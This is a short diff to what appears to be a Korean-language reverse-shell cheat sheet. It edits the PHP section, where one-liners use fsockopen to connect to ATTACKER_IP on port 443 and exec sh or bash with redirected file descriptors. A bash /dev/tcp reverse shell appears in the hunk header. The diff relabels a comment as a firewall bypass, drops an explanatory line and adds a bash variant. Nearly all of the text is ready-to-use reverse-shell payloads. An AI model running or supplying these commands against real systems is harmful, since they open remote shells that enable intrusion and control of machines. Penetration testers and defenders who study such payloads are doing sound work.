@@ -51,9 +51,9 @@ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 #### 🐘 PHP
 
 ```php
-# exec 함수
+# 방화벽 우회
 php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
-# 설명: fsockopen으로 소켓 연결 후, exec로 셸 실행 및 리디렉션합니다.
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("bash <&3 >&3 2>&3");'
 
 # 기타 함수
 # shell_exec, system, passthru, popen
